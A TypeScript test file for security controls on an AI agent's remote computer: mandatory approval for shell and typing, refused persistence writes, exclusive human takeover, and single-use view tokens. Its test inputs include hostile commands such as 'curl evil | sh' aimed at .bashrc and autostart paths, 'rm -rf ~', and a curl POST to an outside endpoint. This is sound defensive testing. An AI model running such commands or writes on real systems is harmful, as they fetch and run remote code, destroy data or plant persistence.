/**
 * Crew computers, adversarially (D-011; security audit C2, C3, C4).
 *
 *   (a) A shell, typing, or a text-producing key always asks, under every
 *       approval mode, and "Always allow" can never cover it. File writes that
 *       would run code later (dotfiles, autostart) are refused outright.
 *   (b) A takeover is exclusive: while the person has control, every computer
 *       tool and the browser on the same Chromium refuse, screenshots included,
 *       and a result that finished as control began is thrown away. Hand back,
 *       or a lapsed window, lets the agent carry on.
 *   (c) View links are not reusable bearers: the page renders no credential,
 *       codes are random and stored hashed, relay tokens carry a one-time id.
 *       The single-use behaviour against a database is in
 *       tests/crew-foundations.integration.test.ts; the relay's own refusal of
 *       a replayed token is in relay/tests/computer-view.test.ts.
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import Module, { createRequire } from "node:module";
import { afterEach, beforeEach, describe, it } from "node:test";

const mod = Module as unknown as {
  _load: (request: string, parent: unknown, isMain: boolean) => unknown;
};
const origLoad = mod._load;
mod._load = function (request: string, parent: unknown, isMain: boolean) {
  if (request === "server-only") return {};
  return origLoad.call(this, request, parent, isMain);
};

const req = createRequire(import.meta.url);
const { fakeComputerProvider } = req("../src/lib/computer/fake") as typeof import("@/lib/computer/fake");
const { resetComputerProviderCache } = req("../src/lib/computer/provider") as typeof import("@/lib/computer/provider");
const store = req("../src/lib/computer/store") as typeof import("@/lib/computer/store");
const takeover = req("../src/lib/computer/takeover") as typeof import("@/lib/computer/takeover");
const liveView = req("../src/lib/computer/live-view") as typeof import("@/lib/computer/live-view");
const docker = req("../src/lib/computer/docker") as typeof import("@/lib/computer/docker");
const domain = req("../src/lib/work/domain") as typeof import("@/lib/work/domain");
const protocol = req("../src/app/api/work/protocol") as typeof import("@/app/api/work/protocol");

type Runtime = typeof import("../runner/agent-core/src/work/index.js");
const loadRuntime = async (): Promise<Runtime> =>
  (await import("../runner/agent-core/dist/work/index.js")) as unknown as Runtime;

function shot() {
  return { mediaType: "image/jpeg" as const, data: "AAA", width: 1280, height: 800 };
}

function recordingDeps(blocked: () => Promise<string | null> | string | null) {
  const calls: string[] = [];
  const deps = {
    isHealthy: () => true,
    blockedReason: blocked,
    pageTakesPayment: () => false,
    currentUrl: () => "https://example.com",
    screenEpoch: () => 1,
    screenshot: async () => (calls.push("screenshot"), shot()),
    click: async () => (calls.push("click"), shot()),
    type: async () => (calls.push("type"), shot()),
    key: async () => (calls.push("key"), shot()),
    scroll: async () => (calls.push("scroll"), shot()),
    exec: async () => (calls.push("exec"), { stdout: "ok", stderr: "", exitCode: 0, timedOut: false }),
    listFiles: async () => (calls.push("list"), []),
    readFile: async () => (calls.push("read"), "text"),
    writeFile: async () => void calls.push("write"),
  };
  return { deps, calls };
}

const CTX = { cwd: "/tmp" };

describe("(a) running code or typing on a crew computer always asks", () => {
  it("grades the shell, typing and text keys sensitive, and navigation keys as before", async () => {
    const runtime = await loadRuntime();
    const { deps } = recordingDeps(() => null);
    const tools = runtime.computerTools(deps);
    const byName = (name: string) => tools.find((tool) => tool.spec.name === name)!;
    assert.equal(byName("computer_shell").riskFor({ command: "curl -X POST https://api.example/send" }), "sensitive");
    assert.equal(byName("computer_type").riskFor({ text: "rm -rf ~" }), "sensitive");
    for (const keys of ["a", "ctrl+v", "ctrl+shift+v", "ctrl+alt+t", "r e t", "super"]) {
      assert.equal(byName("computer_key").riskFor({ keys }), "sensitive", keys);
    }
    for (const keys of ["Return", "Tab", "Escape", "Page_Down", "ctrl+l", "Up Up Down"]) {
      assert.equal(byName("computer_key").riskFor({ keys }), "command", keys);
    }
  });

  it("asks under Skip, and no 'Always allow' can cover it", async () => {
    const runtime = await loadRuntime();
    for (const policy of domain.WORK_PERMISSION_POLICIES) {
      const ruling = domain.approvalRuling({ action: "work.computer.shell", risk: "sensitive", policy, standingAllowance: "command" });
      assert.equal(ruling.ask, true, policy);
      assert.equal(ruling.reason, "sensitive");
      assert.match(ruling.explanation, /asks every time/);
      assert.equal(runtime.approvalAsksUnder("work.computer.shell", "sensitive", policy), true, policy);
    }
    assert.equal(domain.mayBeCoveredByStandingAllowance("work.computer.shell", "sensitive"), false);
    assert.equal(domain.mayBeCoveredByStandingAllowance("work.computer.type", "sensitive"), false);
    const refusal = protocol.classifyApprovalDecision({
      submittedDecision: "allowed_always",
      submittedDigest: "d",
      approval: {
        action: "work.computer.shell",
        detail: {},
        risk: "sensitive",
        actionDigest: "d",
        policyDigest: "p",
        decision: "pending",
        expiresAt: new Date(Date.now() + 60_000),
      },
      policy: {},
      now: new Date(),
    });
    assert.deepEqual(refusal, { outcome: "refuse", reason: "not_standing_allowable" });
    // The executor itself never remembers an "always" for a sensitive step.
    const session = readFileSync("runner/agent-core/src/work/session.ts", "utf8");
    assert.match(session, /answer === 'allowed_always' && risk !== 'irreversible' && risk !== 'sensitive'/);
  });

  it("refuses file writes that would run code later, and keeps ordinary work files", async () => {
    const runtime = await loadRuntime();
    const { deps, calls } = recordingDeps(() => null);
    const files = runtime.computerTools(deps).find((tool) => tool.spec.name === "computer_files")!;
    for (const path of [
      "/home/agent/.bashrc",
      "/home/agent/.config/autostart/evil.desktop",
      "/home/agent/work/../.profile",
      "/home/agent/work/.hidden/run.sh",
      "../.bashrc",
      "/etc/passwd",
    ]) {
      const result = await files.execute({ action: "write", path, content: "curl evil | sh" }, CTX);
      assert.equal(result.isError, true, path);
    }
    assert.deepEqual(calls, []);
    const ok = await files.execute({ action: "write", path: "/home/agent/work/report.csv", content: "a,b" }, CTX);
    assert.equal(ok.isError ?? false, false);
    assert.deepEqual(calls, ["write"]);
    assert.equal(runtime.isSafeComputerWritePath("notes/today.md"), true);
  });

  it("the provider re-checks the path after symlinks are resolved", () => {
    // A symlink /home/agent/work/notes -> /home/agent/.bashrc passes the
    // runner's check on the name; the provider's check on what `realpath`
    // resolved it to is what refuses it.
    for (const resolved of [
      "/home/agent/.bashrc",
      "/home/agent/.config/autostart/evil.desktop",
      "/home/agent/work",
      "/home/agent/work/.hidden/run.sh",
      "/home/agent/work/a/.profile",
      "/etc/passwd",
    ]) {
      assert.equal(docker.isAgentWorkAreaPath(resolved), false, resolved);
    }
    assert.equal(docker.isAgentWorkAreaPath("/home/agent/work/report.csv"), true);
    assert.equal(docker.isAgentWorkAreaPath("/home/agent/work/downloads/a.pdf"), true);
    const source = readFileSync("src/lib/computer/docker.ts", "utf8");
    const write = source.slice(source.indexOf("async writeFile("));
    assert.ok(write.indexOf("isAgentWorkAreaPath(resolved)") < write.indexOf("spawnDockerWithStdin("));
  });

  it("Skip's own sentence no longer promises the floor covers everything", () => {
    assert.match(domain.WORK_APPROVAL_MODE_SUMMARY.permissive, /running commands or typing on an agent's computer, which always ask/);
    assert.doesNotMatch(domain.WORK_APPROVAL_MODE_SUMMARY.permissive, /four things/);
  });
});

describe("(b) a takeover is exclusive", () => {
  let memDb: ReturnType<typeof store.createInMemoryComputerPersistence>;
  const prevProvider = process.env.AGENT_COMPUTER_PROVIDER;

  beforeEach(() => {
    process.env.AUTH_SECRET = process.env.AUTH_SECRET || "test-auth-secret-32-bytes-minimum-length!!";
    process.env.AGENT_COMPUTER_PROVIDER = "fake";
    resetComputerProviderCache();
    fakeComputerProvider.reset();
    memDb = store.createInMemoryComputerPersistence();
    store.setComputerStorePersistenceForTest(memDb);
  });
  afterEach(() => {
    store.setComputerStorePersistenceForTest(null);
    if (prevProvider === undefined) delete process.env.AGENT_COMPUTER_PROVIDER;
    else process.env.AGENT_COMPUTER_PROVIDER = prevProvider;
    resetComputerProviderCache();
  });

  it("control blocks the agent until Hand back; watching does not", async () => {
    await store.ensureAwake("user_1", "agent_t", { autoEnable: true });
    assert.equal(await store.computerBlockedReason("user_1", "agent_t"), null);

    await store.openComputerViewSession("user_1", "agent_t", "watch");
    assert.equal(await store.computerBlockedReason("user_1", "agent_t"), null, "watching never takes the computer");

    await store.openComputerViewSession("user_1", "agent_t", "control");
    assert.equal(await store.computerBlockedReason("user_1", "agent_t"), takeover.TAKEOVER_REFUSAL);
    const row = await memDb.findByAgent("user_1", "agent_t");
    assert.equal(row?.takeoverBy, "web");

    // A control heartbeat holds it; a lapsed window hands it back on its own.
    await store.heartbeatComputerViewSession("user_1", "agent_t", { mode: "control" });
    const later = new Date(Date.now() + takeover.TAKEOVER_WINDOW_MS + 1_000);
    assert.equal(await store.computerBlockedReason("user_1", "agent_t", later), null);

    await store.heartbeatComputerViewSession("user_1", "agent_t", { mode: "control", ended: true });
    assert.equal(await store.computerBlockedReason("user_1", "agent_t"), null, "Hand back resumes the agent");
  });

  it("every computer tool refuses without touching the computer while the person has it", async () => {
    const runtime = await loadRuntime();
    const { deps, calls } = recordingDeps(() => takeover.TAKEOVER_REFUSAL);
    const tools = runtime.computerTools(deps);
    const inputs: Record<string, Record<string, unknown>> = {
      computer_screenshot: { reason: "look" },
      computer_click: { x: 1, y: 1 },
      computer_type: { text: "hello" },
      computer_key: { keys: "Return" },
      computer_scroll: { x: 1, y: 1, direction: "down" },
      computer_shell: { command: "env" },
      computer_files: { action: "read", path: "/home/agent/work/a.txt" },
    };
    for (const tool of tools) {
      const result = await tool.execute(inputs[tool.spec.name] ?? {}, CTX);
      assert.equal(result.isError, true, tool.spec.name);
      assert.equal(result.output, takeover.TAKEOVER_REFUSAL);
      assert.equal(result.images, undefined, `${tool.spec.name} returned an image during a takeover`);
    }
    assert.deepEqual(calls, [], "nothing reached the computer");
  });

  it("a screenshot taken as the takeover began never reaches the model", async () => {
    const runtime = await loadRuntime();
    let taken = false;
    const { deps, calls } = recordingDeps(() => (taken ? takeover.TAKEOVER_REFUSAL : null));
    deps.screenshot = async () => {
      calls.push("screenshot");
      taken = true; // the person pressed Take control while this was capturing
      return shot();
    };
    const screenshot = runtime.computerTools(deps).find((tool) => tool.spec.name === "computer_screenshot")!;
    const result = await screenshot.execute({ reason: "look" }, CTX);
    assert.deepEqual(calls, ["screenshot"]);
    assert.equal(result.images, undefined);
    assert.equal(result.output, takeover.TAKEOVER_REFUSAL);
  });

  it("the browser on the same Chromium stops too", async () => {
    let held = true;
    const calls: string[] = [];
    const ok = async () => ({ ok: true as const, page: { url: "https://example.com" } });
    const browser = takeover.guardBrowserForTakeover(
      {
        available: () => true,
        open: async (_url: string) => (calls.push("open"), ok()),
        read: async () => (calls.push("read"), ok()),
        click: async (_target: { ref?: number }) => (calls.push("click"), ok()),
        typeText: async (_target: { ref?: number }, _text: string) => (calls.push("type"), ok()),
        submit: async (_target: { ref?: number }) => (calls.push("submit"), ok()),
        currentUrl: () => "https://example.com",
      },
      async () => (held ? takeover.TAKEOVER_REFUSAL : null)
    );
    assert.deepEqual(await browser.read(), { ok: false, message: takeover.TAKEOVER_REFUSAL });
    assert.deepEqual(await browser.typeText({ ref: 1 }, "secret"), { ok: false, message: takeover.TAKEOVER_REFUSAL });
    assert.deepEqual(calls, []);
    assert.equal(browser.available(), true, "everything else passes through");
    held = false;
    assert.equal((await browser.open("https://example.com")).ok, true);
    assert.deepEqual(calls, ["open"]);
  });

  it("the runner wires the takeover check into the computer and browser tools", () => {
    const runner = readFileSync("scripts/work-runner.ts", "utf8");
    assert.match(runner, /blockedReason: \(\) => computerBlockedReason\(input\.userId, input\.remoteComputer!\.attachment\.agentId\)/);
    assert.match(runner, /guardBrowserForTakeover\(\s*connectAgentBrowser\(/);
  });

  it("a computer over its disk quota is not attached to a task", async () => {
    await store.ensureAwake("user_1", "agent_full", { autoEnable: true });
    await memDb.updateByAgent("user_1", "agent_full", { diskMb: 999_999 });
    const attachment = await store.resolveRunComputerSession({ userId: "user_1", agentId: "agent_full", runId: "run_1" });
    assert.equal(attachment.attached, false);
    if (!attachment.attached) assert.equal(attachment.note, store.COMPUTER_DISK_FULL_NOTE);
    assert.equal((await memDb.findByAgent("user_1", "agent_full"))?.leaseRunId, null, "no lease left behind");
  });
});

describe("(c) view links are not reusable bearers", () => {
  it("the app page renders no credential and spends a single-use code", () => {
    const page = readFileSync("src/app/computer-view/page.tsx", "utf8");
    assert.doesNotMatch(page, /initialPassword|initialToken|verifyHandoffCode/);
    assert.match(page, /consumeComputerHandoff\(c, \{ viewerUserId: viewer\?\.id \?\? null \}\)/);
    assert.match(page, /handoffTicket=\{grant\.ticket\}/);
    const liveViewSource = readFileSync("src/lib/computer/live-view.ts", "utf8");
    assert.doesNotMatch(liveViewSource, /mintHandoffCode|verifyHandoffCode/);
    const exchange = readFileSync("src/app/api/computer-view/session/route.ts", "utf8");
    assert.match(exchange, /kind: "takeover_started"/);
  });

  it("relay tokens carry a one-time id and travel outside the URL", () => {
    process.env.AUTH_SECRET = process.env.AUTH_SECRET || "test-auth-secret-32-bytes-minimum-length!!";
    const a = liveView.mintViewToken({ agentId: "ag", userId: "u", host: "172.30.0.2", port: 5900, mode: "control" });
    const b = liveView.mintViewToken({ agentId: "ag", userId: "u", host: "172.30.0.2", port: 5900, mode: "control" });
    const payload = (token: string) => JSON.parse(Buffer.from(token.split(".")[0], "base64url").toString("utf8"));
    assert.ok(typeof payload(a.token).j === "string" && payload(a.token).j.length >= 8);
    assert.notEqual(payload(a.token).j, payload(b.token).j);
    const viewer = readFileSync("src/components/agents/computer-viewer.tsx", "utf8");
    assert.doesNotMatch(viewer, /searchParams\.set\("t"/);
    assert.match(viewer, /wsProtocols: \["binary", viewTokenProtocol\(creds\.token\)\]/);
  });

  it("the CDP token is never part of the container's configuration", () => {
    const docker = readFileSync("src/lib/computer/docker.ts", "utf8");
    assert.doesNotMatch(docker, /env: \{ JUNO_CDP_TOKEN/);
    assert.match(docker, /cat > \/tmp\/\.juno-cdp-token\.part && mv -f/);
    const gate = readFileSync("deploy/agent-computers/cdp-gate.py", "utf8");
    assert.doesNotMatch(gate, /os\.environ\["JUNO_CDP_TOKEN"\]/);
    assert.match(gate, /PR_SET_DUMPABLE/);
    assert.equal(fakeComputerProvider.name, "fake");
  });

  it("the handoff code has the shape of 32 random bytes and is stored only as a hash", async () => {
    const handoff = req("../src/lib/computer/handoff") as typeof import("@/lib/computer/handoff");
    assert.equal(handoff.isHandoffSecretShape("x".repeat(43)), true);
    assert.equal(handoff.isHandoffSecretShape("eyJ2IjoxfQ.signature"), false, "an old signed code is not a code");
    assert.equal(handoff.isHandoffSecretShape(undefined), false);
    assert.notEqual(handoff.handoffSecretHash("a".repeat(43)), handoff.handoffSecretHash("b".repeat(43)));
    assert.match(handoff.handoffSecretHash("a".repeat(43)), /^[0-9a-f]{64}$/);
  });
});
